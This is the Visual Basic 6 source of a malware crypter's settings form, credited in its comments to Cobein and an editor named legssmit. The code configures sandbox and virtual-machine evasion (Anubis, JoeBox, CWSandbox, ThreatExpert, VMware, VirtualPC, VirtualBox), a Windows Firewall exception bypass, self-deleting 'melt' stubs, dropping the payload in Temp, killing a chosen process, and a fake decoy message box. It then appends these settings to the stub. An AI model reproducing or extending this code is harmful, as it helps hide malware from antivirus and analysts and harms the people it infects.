VERSION 5.00
Begin VB.Form Form2 
   BackColor       =   &H80000018&
   BorderStyle     =   0  'None
   Caption         =   "Settings"
   ClientHeight    =   7380
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   6420
   LinkTopic       =   "Form2"
   Picture         =   "Form2.frx":0000
   ScaleHeight     =   7380
   ScaleWidth      =   6420
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.Frame Frame7 
      BackColor       =   &H80000014&
      Caption         =   "Kill Process When Run"
      Height          =   975
      Left            =   2280
      TabIndex        =   34
      Top             =   2280
      Width           =   2055
      Begin VB.CheckBox Check14 
         BackColor       =   &H80000014&
         Caption         =   "Enable"
         Height          =   255
         Left            =   120
         TabIndex        =   36
         Top             =   240
         Width           =   1695
      End
      Begin VB.TextBox Text5 
         Enabled         =   0   'False
         Height          =   285
         Left            =   120
         TabIndex        =   35
         Top             =   480
         Width           =   1695
      End
   End
   Begin VB.CheckBox Check10 
      BackColor       =   &H80000014&
      Caption         =   "ReAlign PE Headers"
      Height          =   255
      Left            =   2400
      TabIndex        =   10
      Top             =   960
      Value           =   1  'Checked
      Width           =   1815
   End
   Begin VB.CheckBox Check8 
      BackColor       =   &H80000014&
      Caption         =   "Anti VirtualBox"
      Height          =   255
      Left            =   480
      TabIndex        =   6
      Top             =   2400
      Value           =   1  'Checked
      Width           =   1455
   End
   Begin VB.CheckBox Check7 
      BackColor       =   &H80000014&
      Caption         =   "Anti VirtualPC"
      Height          =   255
      Left            =   480
      TabIndex        =   5
      Top             =   2160
      Value           =   1  'Checked
      Width           =   1335
   End
   Begin VB.CheckBox Check6 
      BackColor       =   &H80000014&
      Caption         =   "Anti VMware"
      Height          =   255
      Left            =   480
      TabIndex        =   4
      Top             =   1920
      Value           =   1  'Checked
      Width           =   1335
   End
   Begin VB.CheckBox Check5 
      BackColor       =   &H80000014&
      Caption         =   "Anti Anubis"
      Height          =   255
      Left            =   480
      TabIndex        =   3
      Top             =   1680
      Value           =   1  'Checked
      Width           =   1455
   End
   Begin VB.CheckBox Check4 
      BackColor       =   &H80000014&
      Caption         =   "Anti ThreatExpert"
      Height          =   255
      Left            =   480
      Picture         =   "Form2.frx":D5B7
      TabIndex        =   2
      Top             =   1440
      Value           =   1  'Checked
      Width           =   1575
   End
   Begin VB.CheckBox Check3 
      BackColor       =   &H80000014&
      Caption         =   "Anti CWSandbox"
      Height          =   255
      Left            =   480
      TabIndex        =   1
      Top             =   1200
      Value           =   1  'Checked
      Width           =   1575
   End
   Begin VB.CheckBox Check2 
      BackColor       =   &H80000014&
      Caption         =   "Anti JoeBox"
      Height          =   255
      Left            =   480
      TabIndex        =   0
      Top             =   960
      Value           =   1  'Checked
      Width           =   1455
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H80000014&
      Caption         =   "Extra Settings"
      Height          =   1455
      Left            =   2280
      TabIndex        =   11
      Top             =   720
      Width           =   3615
      Begin VB.CheckBox Check9 
         BackColor       =   &H80000014&
         Caption         =   "Add to Windows Firewall Execptions"
         Height          =   855
         Left            =   2040
         TabIndex        =   37
         Top             =   240
         Width           =   1455
      End
      Begin VB.TextBox Text4 
         Enabled         =   0   'False
         Height          =   285
         Left            =   120
         TabIndex        =   32
         Text            =   "673353.tmp"
         Top             =   960
         Width           =   1695
      End
      Begin VB.CheckBox Check13 
         BackColor       =   &H80000014&
         Caption         =   "Melt Stub"
         Height          =   255
         Left            =   120
         TabIndex        =   31
         Top             =   480
         Width           =   1695
      End
      Begin VB.Label Label11 
         BackColor       =   &H80000014&
         Caption         =   "Drop In Temp As :"
         Height          =   255
         Left            =   120
         TabIndex        =   33
         Top             =   720
         Width           =   1455
      End
   End
   Begin VB.Frame Frame2 
      BackColor       =   &H80000014&
      Caption         =   "Anti Settings"
      Height          =   2055
      Left            =   360
      TabIndex        =   12
      Top             =   720
      Width           =   1815
   End
   Begin VB.Frame Frame4 
      BackColor       =   &H80000014&
      Caption         =   "Fake Message Box"
      Height          =   3375
      Left            =   360
      TabIndex        =   14
      Top             =   3240
      Width           =   5775
      Begin VB.CheckBox Check12 
         BackColor       =   &H80000014&
         Caption         =   "Enable"
         Height          =   255
         Left            =   120
         TabIndex        =   18
         Top             =   240
         Width           =   855
      End
      Begin VB.TextBox Text2 
         Enabled         =   0   'False
         Height          =   855
         Left            =   120
         MultiLine       =   -1  'True
         TabIndex        =   17
         Top             =   840
         Width           =   1935
      End
      Begin VB.Frame Frame5 
         BackColor       =   &H80000014&
         Caption         =   "Message Box Input"
         Height          =   2535
         Left            =   2400
         TabIndex        =   16
         Top             =   240
         Width           =   3255
         Begin VB.Frame Frame3 
            BackColor       =   &H80000014&
            Caption         =   "Specials"
            Height          =   1935
            Left            =   1920
            TabIndex        =   38
            Top             =   240
            Width           =   1095
            Begin VB.OptionButton Option11 
               BackColor       =   &H80000014&
               Caption         =   "Option11"
               Enabled         =   0   'False
               Height          =   255
               Left            =   120
               TabIndex        =   44
               Top             =   360
               Width           =   255
            End
            Begin VB.PictureBox Picture1 
               BackColor       =   &H80000014&
               BorderStyle     =   0  'None
               Height          =   495
               Left            =   360
               Picture         =   "Form2.frx":1AB6E
               ScaleHeight     =   495
               ScaleWidth      =   495
               TabIndex        =   43
               Top             =   240
               Width           =   495
            End
            Begin VB.OptionButton Option12 
               BackColor       =   &H80000014&
               Caption         =   "Option12"
               Enabled         =   0   'False
               Height          =   255
               Left            =   120
               TabIndex        =   42
               Top             =   1440
               Width           =   255
            End
            Begin VB.OptionButton Option8 
               BackColor       =   &H80000014&
               Enabled         =   0   'False
               Height          =   255
               Left            =   120
               TabIndex        =   41
               Top             =   840
               Width           =   255
            End
            Begin VB.PictureBox Picture2 
               BackColor       =   &H80000014&
               BorderStyle     =   0  'None
               Height          =   495
               Left            =   360
               Picture         =   "Form2.frx":1B451
               ScaleHeight     =   495
               ScaleWidth      =   615
               TabIndex        =   40
               Top             =   720
               Width           =   615
            End
            Begin VB.PictureBox Picture3 
               BackColor       =   &H80000014&
               BorderStyle     =   0  'None
               Height          =   495
               Left            =   360
               Picture         =   "Form2.frx":1B70C
               ScaleHeight     =   495
               ScaleWidth      =   495
               TabIndex        =   39
               Top             =   1320
               Width           =   495
            End
         End
         Begin VB.OptionButton Option13 
            BackColor       =   &H80000014&
            Caption         =   "Ok, Help"
            Enabled         =   0   'False
            Height          =   255
            Left            =   120
            TabIndex        =   30
            Top             =   1680
            Width           =   1455
         End
         Begin VB.OptionButton Option10 
            BackColor       =   &H80000014&
            Caption         =   "Yes, No, Cancel"
            Enabled         =   0   'False
            Height          =   255
            Left            =   120
            TabIndex        =   26
            Top             =   1440
            Width           =   1575
         End
         Begin VB.OptionButton Option9 
            BackColor       =   &H80000014&
            Caption         =   "Yes, No"
            Enabled         =   0   'False
            Height          =   255
            Left            =   120
            TabIndex        =   25
            Top             =   1200
            Width           =   1815
         End
         Begin VB.OptionButton Option7 
            BackColor       =   &H80000014&
            Caption         =   "Abort, Retry, Ignore"
            Enabled         =   0   'False
            Height          =   255
            Left            =   120
            TabIndex        =   24
            Top             =   960
            Width           =   1935
         End
         Begin VB.OptionButton Option6 
            BackColor       =   &H80000014&
            Caption         =   "Retry, Cancel"
            Enabled         =   0   'False
            Height          =   255
            Left            =   120
            TabIndex        =   23
            Top             =   720
            Width           =   1695
         End
         Begin VB.OptionButton Option5 
            BackColor       =   &H80000014&
            Caption         =   "OK, Cancel"
            Enabled         =   0   'False
            Height          =   255
            Left            =   120
            TabIndex        =   22
            Top             =   480
            Width           =   1695
         End
         Begin VB.OptionButton Option4 
            BackColor       =   &H80000014&
            Caption         =   "OK"
            Enabled         =   0   'False
            Height          =   255
            Left            =   120
            TabIndex        =   21
            Top             =   240
            Width           =   1695
         End
      End
      Begin VB.TextBox Text3 
         Enabled         =   0   'False
         Height          =   1095
         Left            =   120
         MultiLine       =   -1  'True
         TabIndex        =   15
         Top             =   2040
         Width           =   1935
      End
      Begin VB.Label Label10 
         BackStyle       =   0  'Transparent
         Caption         =   "Preview"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000018&
         Height          =   255
         Left            =   2880
         TabIndex        =   29
         Top             =   3000
         Visible         =   0   'False
         Width           =   855
      End
      Begin VB.Label Label8 
         BackStyle       =   0  'Transparent
         Caption         =   "Preview"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000016&
         Height          =   255
         Left            =   2880
         TabIndex        =   27
         Top             =   3000
         Width           =   855
      End
      Begin VB.Image Image4 
         Height          =   435
         Left            =   2280
         Picture         =   "Form2.frx":1BB05
         Top             =   2880
         Width           =   1965
      End
      Begin VB.Label Label7 
         BackColor       =   &H80000014&
         Caption         =   "Message"
         Height          =   255
         Left            =   120
         TabIndex        =   20
         Top             =   1800
         Width           =   1935
      End
      Begin VB.Label Label5 
         BackColor       =   &H80000014&
         Caption         =   "Caption"
         Height          =   255
         Left            =   120
         TabIndex        =   19
         Top             =   600
         Width           =   1815
      End
   End
   Begin VB.Label Label9 
      BackStyle       =   0  'Transparent
      Caption         =   "OK"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000016&
      Height          =   255
      Left            =   3240
      TabIndex        =   28
      Top             =   4200
      Width           =   855
   End
   Begin VB.Label Label4 
      BackStyle       =   0  'Transparent
      Caption         =   "OK"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000018&
      Height          =   255
      Left            =   3120
      TabIndex        =   9
      Top             =   6840
      Visible         =   0   'False
      Width           =   855
   End
   Begin VB.Label Label6 
      BackColor       =   &H80000014&
      Height          =   255
      Left            =   480
      TabIndex        =   13
      Top             =   5160
      Width           =   1815
   End
   Begin VB.Image Image5 
      Height          =   8610
      Left            =   0
      Picture         =   "Form2.frx":1F779
      Top             =   360
      Width           =   60
   End
   Begin VB.Image Image1 
      Height          =   60
      Left            =   0
      Picture         =   "Form2.frx":228CF
      Top             =   7320
      Width           =   11985
   End
   Begin VB.Image Image7 
      Height          =   8610
      Left            =   6360
      Picture         =   "Form2.frx":25AE6
      Top             =   360
      Width           =   60
   End
   Begin VB.Label Label3 
      BackStyle       =   0  'Transparent
      Caption         =   "OK"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000016&
      Height          =   255
      Left            =   3120
      TabIndex        =   8
      Top             =   6840
      Width           =   855
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "                                            Settings"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   0
      TabIndex        =   7
      Top             =   0
      Width           =   5775
   End
   Begin VB.Image Image3 
      Height          =   255
      Left            =   5880
      Picture         =   "Form2.frx":28BF3
      Top             =   60
      Visible         =   0   'False
      Width           =   495
   End
   Begin VB.Image Image2 
      Height          =   255
      Left            =   5880
      Picture         =   "Form2.frx":2BE18
      Top             =   60
      Width           =   495
   End
   Begin VB.Image Image9 
      Height          =   375
      Left            =   0
      Picture         =   "Form2.frx":2F031
      Top             =   0
      Width           =   12000
   End
   Begin VB.Image Image8 
      Height          =   435
      Left            =   2280
      Picture         =   "Form2.frx":3387C
      Top             =   6720
      Width           =   1965
   End
   Begin VB.Image Image15 
      DragMode        =   1  'Automatic
      Height          =   12000
      Left            =   120
      Picture         =   "Form2.frx":374F0
      Top             =   360
      Width           =   12000
   End
End
Attribute VB_Name = "Form2"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Crypter based off Cobeins Cryptosy
'Edited by legssmit
' Use  : At your own risk
' ' Distribution: You can freely use this code in your own
'               applications, but you may not reproduce
'               or publish this code on any web site,
'               online service, or distribute as source
'               on any media without express permission FROM COBEIN AND ME (Legssmit).

Const DATA_START = "[DATTTA]"
Const DATA_ARRAY = "[12#21]"
Dim SERVER_RESOURCE() As Byte


Private Dragging As Boolean
Private SettedX As Integer, SettedY As Integer
Private Sub Check9_Click()

If Check9.Value = Checked Then
    FWBypass = 1
 Else
    Check9.Value = vbUnchecked
    FWBypass = 0
End If
End Sub


Private Sub Check2_Click()

If Check2.Value = Checked Then
    AntiJoeBox = 1
 Else
    Check2.Value = vbUnchecked
    AntiJoeBox = 0
End If
End Sub

Private Sub Check3_Click()

If Check3.Value = Checked Then
    AntiCWSandBox = 1
 Else
    Check3.Value = vbUnchecked
    AntiCWSandBox = 0
End If
End Sub

Private Sub Check4_Click()

If Check4.Value = Checked Then
    AntiThreatExpert = 1
 Else
    Check4.Value = vbUnchecked
    AntiThreatExpert = 0
End If
End Sub

Private Sub Check5_Click()

If Check5.Value = Checked Then
    AntiAnubis = 1
 Else
    Check5.Value = vbUnchecked
    AntiAnubis = 0
End If
End Sub

Private Sub Check6_Click()
If Check6.Value = Checked Then
    AntiVMware = 1
 Else
    Check6.Value = vbUnchecked
    AntiVMware = 0
End If
End Sub

Private Sub Check7_Click()
If Check7.Value = Checked Then
    AntiVirtualPC = 1
 Else
    Check7.Value = vbUnchecked
    AntiVirtualPC = 0
End If
End Sub

Private Sub Check8_Click()
If Check8.Value = Checked Then
    AntiVirtualBox = 1
 Else
    Check8.Value = vbUnchecked
    AntiVirtualBox = 0
End If
End Sub


Private Sub Check10_Click()
If Check10.Value = Checked Then
    ValidatePE = 1
 Else
    Check10.Value = vbUnchecked
    ValidatePE = 0
End If
End Sub



Private Sub Check12_Click()

If Check12.Value = Checked Then
    Text2.Enabled = True
    Text3.Enabled = True
    Option4.Enabled = True
    Option5.Enabled = True
    Option6.Enabled = True
    Option7.Enabled = True
    Option8.Enabled = True
    Option9.Enabled = True
    Option10.Enabled = True
    Option11.Enabled = True
    Option12.Enabled = True
    Option13.Enabled = True
 Else
    Check12.Value = vbUnchecked
    Text2.Enabled = False
    Text2 = ""
    Text3.Enabled = False
    Text3 = ""
    Option4.Enabled = False
    Option5.Enabled = False
    Option6.Enabled = False
    Option7.Enabled = False
    Option8.Enabled = False
    Option9.Enabled = False
    Option10.Enabled = False
    Option11.Enabled = False
    Option12.Enabled = False
    Option13.Enabled = False
End If
End Sub
Private Sub Check13_Click()

If Check13.Value = Checked Then
    MeltStub = 1
    Text4.Enabled = True
 Else
    Check13.Value = vbUnchecked
    Text4.Enabled = False
    MeltStub = 0
End If
End Sub
Private Sub Check14_Click()

If Check14.Value = Checked Then
    Text5.Enabled = True
 Else
    Check14.Value = vbUnchecked
    Text5.Enabled = False
End If
End Sub

Private Sub Image4_Click()
Call PreviewMsg
End Sub

Private Sub Label10_Click()
Call PreviewMsg
End Sub

Private Sub Image2_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Image3.Visible = True
End Sub

Private Sub Image3_Click()
Call CheckIfMsg
End Sub

Private Sub Image8_Click()
Call CheckIfMsg
End Sub

Private Sub Label1_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
    SettedX = x
    SettedY = y
    Dragging = True
End Sub

Private Sub Label1_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
    If Dragging Then
        Me.Left = Me.Left + (x - SettedX)
        Me.Top = Me.Top + (y - SettedY)
    End If
Image3.Visible = False
End Sub

Private Sub Label1_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
    Dragging = False
End Sub

Private Sub Image9_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Image3.Visible = False
End Sub
Public Function WriteSettings()

MsgMessage = Text3
MsgCaption = Text2

DropAs = Text4
ProcToKill = Text5

On Error Resume Next

Put #1, LOF(1) + 1, DATA_START + AntiSandBoxie + DATA_ARRAY + AntiAnubis + DATA_ARRAY + AntiThreatExpert + DATA_ARRAY + AntiCWSandBox + DATA_ARRAY + AntiJoeBox + DATA_ARRAY + AntiVMware + DATA_ARRAY + AntiVirtualPC + DATA_ARRAY + AntiVirtualBox + DATA_ARRAY + EncryptionKey + DATA_ARRAY + FWBypass + DATA_ARRAY + LengteOrig + DATA_ARRAY + MsgOptions + DATA_ARRAY + MsgMessage + DATA_ARRAY + MsgCaption + DATA_ARRAY + MeltStub + DATA_ARRAY + DropAs + DATA_ARRAY + ProcToKill + DATA_ARRAY

End Function
Private Sub Label4_Click()
Call CheckIfMsg
End Sub

Private Sub Label3_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Label4.Visible = True
End Sub

Private Sub Image15_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Label4.Visible = False
End Sub

Private Sub Label8_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Label10.Visible = True
End Sub

Private Sub Frame4_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Label10.Visible = False
End Sub

Private Function PreviewMsg()
If Check12.Value = Checked Then

If Text3 = "" Then
MsgBox "Please fill in a message.", vbCritical
Exit Function
End If

If Text2 = "" Then
MsgBox "Please fill in a caption.", vbCritical
Exit Function
End If

If Option4.Value = False And Option5.Value = False And Option6.Value = False And Option7.Value = False And Option8.Value = False And Option9.Value = False And Option10.Value = False And Option11.Value = False And Option12.Value = False And Option13.Value = False Then
MsgBox "Please select the input for the fake message.", vbCritical
Exit Function
End If

If Option4.Value = True Then MsgOptions = 0
If Option5.Value = True Then MsgOptions = 1
If Option6.Value = True Then MsgOptions = 5
If Option7.Value = True Then MsgOptions = 2
If Option13.Value = True Then MsgOptions = 16384
If Option9.Value = True Then MsgOptions = 4
If Option10.Value = True Then MsgOptions = 3
If Option8.Value = True Then MsgOptions = MsgOptions + 16
If Option11.Value = True Then MsgOptions = MsgOptions + 48
If Option12.Value = True Then MsgOptions = MsgOptions + 64
MsgBox Text3, MsgOptions, Text2
Else
MsgBox "Fake Messagebox is not enabled.", vbCritical
End If
End Function

Private Function CheckIfMsg()
Dim CheckForDot As String
DropAs = Text4
CheckForDot = HowManyOf(DropAs, ".")
If CheckForDot = 0 Then
MsgBox "Please set an extension for the file to be dropped in the Temp.", vbCritical
Exit Function
End If

If Check12.Value = Checked Then
If Text3 = "" Then
MsgBox "Please fill in a message of the fake message.", vbCritical
End If
If Text2 = "" Then
MsgBox "Please fill in a caption of the fake message..", vbCritical
End If
If Option4.Value = False And Option5.Value = False And Option6.Value = False And Option7.Value = False And Option8.Value = False And Option9.Value = False And Option10.Value = False And Option11.Value = False And Option12.Value = False And Option13.Value = False Then
MsgBox "Please select the input for the fake message.", vbCritical
End If
Else
Form2.Hide
End If
If Check12.Value = Checked And Text3 <> "" And Text2 <> "" And (Option4.Value = True Or Option5.Value = True Or Option6.Value = True Or Option7.Value = True Or Option8.Value = True Or Option9.Value = True Or Option10.Value = True Or Option11.Value = True Or Option12.Value = True Or Option13.Value = True) Then Form2.Hide
End Function


Public Function HowManyOf(ByVal MyString As String, ByVal MyChar As String)
    HowManyOf = Len(MyString) - Len(Replace$(MyString, MyChar, String(Len(MyChar) - 1, " ")))
End Function

